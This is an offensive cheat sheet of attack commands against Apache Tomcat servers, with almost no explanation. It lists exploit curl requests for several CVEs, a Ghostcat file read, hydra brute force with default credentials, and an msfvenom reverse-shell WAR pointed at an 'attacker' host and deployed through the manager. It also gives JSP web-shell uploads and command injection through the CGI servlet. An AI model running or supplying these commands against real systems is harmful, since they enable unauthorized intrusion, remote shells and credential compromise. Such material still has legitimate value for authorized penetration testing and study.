# Tomcat Attacks

## 1. CVE-2025-24813 — RCE
```bash
# Apache Tomcat < 9.0.98, < 10.1.34, < 11.0.2
# PUT + partial PUT for deserialization
curl -sk -X PUT "http://target/uploads/exploit" -H "Content-Range: bytes 0-100/200" -d @payload.ser
```

## 2. Ghostcat (CVE-2020-1938)
```bash
# AJP connector file read
python3 ghostcat.py -t target -p 8009 -f /WEB-INF/web.xml
```

## 3. Manager Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /manager/html
# Default creds: admin:admin, tomcat:tomcat, admin:tomcat
```

## 4. WAR Deployment
```bash
# Generate reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war
# Deploy
curl -u admin:admin -X PUT "http://target/manager/text/deploy?path=/shell" --data-binary @shell.war
# Access
curl -sk "http://target/shell/"
```

## 5. Tomcat Console
```
/manager/html
/manager/text
/host-manager/html
/host-manager/text
```

## 6. JSP Upload
```bash
# If upload allows .jsp
echo '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>' > shell.jsp
curl -sk -X POST "http://target/upload" -F "file=@shell.jsp"
```

## 7. CVE-2019-0232 — CGI Servlet RCE
```bash
# Tomcat on Windows with enableCmdLineArguments
curl -sk "http://target/cgi-bin/hello.bat?&dir"
```

## 8. CVE-2017-12617 — PUT Upload
```bash
# PUT method to upload JSP
curl -sk -X PUT "http://target/shell.jsp/" -d '<%Runtime.getRuntime().exec("id");%>'
```

## 9. CVE-2009-3843 — Manager Auth Bypass
```bash
curl -sk "http://target/manager/html" -H "Authorization: Basic YWRtaW46YWRtaW4="
```

## 10. Session Manipulation
```bash
# Tomcat session cookie: JSESSIONID
# Predict/brute force session IDs
```

## Detection
```bash
curl -sk "http://target/" -I | grep -i "Apache-Coyote\|Tomcat"
curl -sk "http://target/manager/html"
curl -sk "http://target/serverinfo"
```
